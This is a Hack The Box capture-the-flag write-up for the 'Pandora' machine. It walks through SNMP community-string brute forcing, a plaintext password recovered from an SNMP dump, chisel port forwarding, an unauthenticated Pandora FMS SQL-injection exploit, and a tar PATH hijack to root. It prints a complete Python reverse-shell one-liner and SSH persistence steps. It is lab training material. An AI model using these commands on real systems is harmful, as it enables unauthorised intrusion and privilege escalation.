---
title: "[EASY] HTB-Pandora"
draft: false
tags:
  - htb
  - linux
  - snmp
  - snmpwalk
  - snmapbulkwalk
  - suid
  - pivoting
  - chisel
  - port-forwarding
  - sqli
  - persistence
  - ltrace
---


![](https://i.imgur.com/jqQBz00.png)




## Information Gathering
### Rustscan

Rustscan finds **SSH** and **HTTP** running on TCP:

```bash
┌──(yoon㉿kali)-[~/Documents/htb]
└─$ rustscan --addresses 10.10.11.136 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢
<snip>
Host is up, received syn-ack (0.26s latency).
Scanned at 2024-04-11 03:02:02 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```

### Nmap UDP

UDP scan discovers **SNMP** running on UDP port **161**:

![](https://i.imgur.com/23KvK7v.png)


## Enumertion on TCP
### HTTP - TCP 80
Website shows the domain name **panda.htb** which I add to `/etc/hosts`:

![](https://i.imgur.com/IyCIs4u.png)


Both directory bruteforce and subdomain bruteforce has no useful information so I will move on to UDP from here. 

## Enumeration on UDP
### SNMP - UDP 161

> In SNMP (Simple Network Management Protocol), a community string is essentially a password or a key that acts as a form of authentication between an SNMP manager (or client) and an SNMP agent (or server).

Using hydra I will first try bruteforcing Community String:

`hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.11.136 snmp`

![](https://i.imgur.com/jAZXor4.png)


hydra successfully discovers the password: **public**

> In SNMP (Simple Network Management Protocol), MIB stands for Management Information Base. It's a virtual database that contains a hierarchical structure of managed objects. These objects represent various aspects of the managed network devices, such as hardware, software, configuration settings, performance metrics, and more.

Below are some known MIB values on SNMP that could be useful to query:

```MIB
1.3.6.1.2.1.25.1.6.0    System Processes
1.3.6.1.2.1.25.4.2.1.2  Running Programs
1.3.6.1.2.1.25.4.2.1.4  Processes Path
1.3.6.1.2.1.25.2.3.1.4  Storage Units
1.3.6.1.2.1.25.6.3.1.2  Software's Installed & Hotfixes
1.3.6.1.2.1.6.13.1.3    TCP Local Ports
1.3.6.1.2.1.1.1         System Description 
```

For instance, I can query running programs as such:

`snmpwalk -c public -v1 10.10.11.136 1.3.6.1.2.1.25.4.2.1.2 `

![](https://i.imgur.com/MU77UCA.png)


I can also query system description as such:

`snmpwalk -c public -v1 10.10.11.136 1.3.6.1.2.1.1.1`

![](https://i.imgur.com/WbRQW5Y.png)


## Shell as daniel
#### snmpbulkwalk


Dumping the entire SNMP tree using `snmpwalk -v 2c -c public 10.10.11.136` takes too much time so I will move on to faster way of dumping using **snmpbulkwalk**.

I will frist download relevant packages using `sudo apt install snmp-mibs-downloader`.

Once installed, I will open `/etc/snmp/snmp.conf` and comment out the ‘**mibs**’ line as such:

![](https://i.imgur.com/gAiyvDF.png)


Now with **snmpbulkwalk** ready, I will dump the entire SNMP tree and save it to a txt file:

`snmpbulkwalk -c public -v2c 10.10.11.136 > snmp-full-bulk`

![](https://i.imgur.com/jYrvbD2.png)


The dump was 6920 lines long and after spending some time analyzing, it reveals the plain text password for user **daniel**: **HotelBabylon23**

![](https://i.imgur.com/smEpwfQ.png)


Now using the credeitals above, I have a SSH connection as daniel:

![](https://i.imgur.com/BeGtYP5.png)


## Privesc: daniel to matt
### Local Enumeration

Taking a look at `/etc/passwd`, there is user **matt** on system:

`cat /etc/passwd | grep /bin/bash`

![](https://i.imgur.com/OTqYHwO.png)


Since user.txt is located in matt's home folder without reading access, privilege escalation should be done towards user matt.

I do see interesting SUID file called **/usr/bin/pandora_backup** but it is owned by user matt, so I would first have to escalate my privilege.

![](https://i.imgur.com/87z2fE9.png)


On `/etc/apache2/sites-enabled`, I see **pandora.conf** file, which implies there's another website running internally:

![](https://i.imgur.com/aVWMlZ5.png)


It seems like **pandora.panda.htb** is running locally on port 80:

![](https://i.imgur.com/wY0MeCA.png)


I can confirm this through `netstat -ntlp` command, seeing port 80 is open internally:

![](https://i.imgur.com/I6nmUzI.png)


On `/var/www/pandora`, I can access files for the internal website:

![](https://i.imgur.com/6pQ9GXL.png)




### Port Forwarding

To access the website through web browser, I will port forward internal port 80 to local side using chisel.

I will first download chisel to pandora server using `wget http://10.10.14.14:8000/chisel_linux`.

Now with chisel server running locally on Kali machine, I will start the client session on pandora server:

![](https://i.imgur.com/UUgXkZN.png)


I get a incoming chisel server running on kali machine:

![](https://i.imgur.com/kYQd7YG.png)


Now I can access the internal website on my Kali web browser:


![](https://i.imgur.com/BMXIemI.png)





### SQLi to RCE

At the bottom of the website, version for Pandora FMS is revealed:

![](https://i.imgur.com/LYWDHyY.png)


This version is vulnerable to Remote code execution and SQL injection but RCE requires user creds so my only option left is SQLi.

Using [this github source](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated), I can spawn a shell as user **matt**:

`sudo python sql.py -t 127.0.0.1 -f rev.php`

![](https://i.imgur.com/chVOtIN.png)


Since the shell is very restricted, I will spawn another reverse shell through this shell connection by running the following command towards my netcat listener running on Kali machine:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Now I have a shell as matt:

![](https://i.imgur.com/EVqUjfM.png)



### SSH Persistence

Since reverse shell connection is not stable, I will further develop my privilege as matt by creating ssh key.

Following [this guide](https://jadu101.github.io/Persistence%F0%9F%A5%B7%F0%9F%8F%BB/Linux-Persistence#ssh-as-root), I will create ssh private and public key on matt's home directory:

![](https://i.imgur.com/Kdti8Gp.png)


Now using the private key, I can SSH-in as user **matt**:

`ssh -i mykey matt@10.10.11.136`

![](https://i.imgur.com/TnWKSJm.png)





## Privesc: matt to root
### SUID

Remembering about interesting SUID found earlier, I will take a look at `/usr/bin/pandora_backup`

![](https://i.imgur.com/7z9MlQv.png)

Root owns this file but group matt can run this file as root. 

Running the file, I can see that backup is being made to some end point:


![](https://i.imgur.com/DsmIy15.png)

It seems like all the files in `/var/www/pandora/pandora_console` is being backedup:

![](https://i.imgur.com/6SDZiOI.png)

I can take a rough look at it through `cat` and it seems like tar is being used to make backup to `/root/.backup`:

![](https://i.imgur.com/9uL9JCA.png)


I can take a better look at it using **ltrace**:

`ltrace /usr/bin/pandora_backup`

![](https://i.imgur.com/03y8EG6.png)

Because there’s no path given for tar, it will use the current user’s PATH environment variable to look for valid executables to run. But I can control that path, which makes this likely vulnerable to path hijack.

I’ll work from `/dev/shm`, and add that to the current user’s PATH:

![](https://i.imgur.com/dCc3h78.png)

Now the first place it will look for **tar** is `/dev/shm`.

I will create a simple payload that will run bash as root inside tar as such:

![](https://i.imgur.com/AIpHMhO.png)


Running **pandora_backup** will spawn a shell as root:

![](https://i.imgur.com/l0W0Cr0.png)


## References
- https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained
- https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated